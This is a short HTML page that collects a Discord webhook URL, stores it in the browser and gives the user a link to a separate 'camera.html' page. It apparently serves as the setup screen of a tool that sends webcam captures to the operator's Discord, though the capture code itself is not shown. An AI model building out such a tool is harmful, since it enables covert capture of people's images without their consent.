<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Webhook</title>
    <style>
        body {
            background: linear-gradient(to bottom, #000, #111);
            font-family: 'Poppins', sans-serif;
            color: white;
            text-align: center;
            padding: 50px;
        }
        h1 {
            font-size: 2rem;
            color: #fff;
        }
        input {
            padding: 10px;
            font-size: 1rem;
            border-radius: 10px;
            margin-top: 20px;
            width: 80%;
        }
        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 1rem;
            border: none;
            border-radius: 10px;
            background: linear-gradient(to right, #f0f, #0ff);
            color: white;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <h1>Enter Your Discord Webhook URL</h1>
    <input type="text" id="webhookInput" placeholder="Enter webhook URL here" />
    <br>
    <button id="generateLinkButton">Generate Link</button>
    <p id="linkMessage"></p>

    <script>
        const webhookInput = document.getElementById('webhookInput');
        const generateLinkButton = document.getElementById('generateLinkButton');
        const linkMessage = document.getElementById('linkMessage');

        // Generate and redirect user to camera page with their webhook
        generateLinkButton.addEventListener('click', () => {
            const webhookUrl = webhookInput.value.trim();
            if (!webhookUrl) {
                linkMessage.textContent = "Please enter a valid webhook URL.";
                return;
            }

            // Save the webhook URL in localStorage
            localStorage.setItem('userWebhook', webhookUrl);

            // Generate the special link and display it
            const cameraLink = `${window.location.origin}/camera.html`;
            linkMessage.innerHTML = `Click here to go to your camera: <a href="${cameraLink}" target="_blank">${cameraLink}</a>`;
        });
    </script>
</body>
</html>
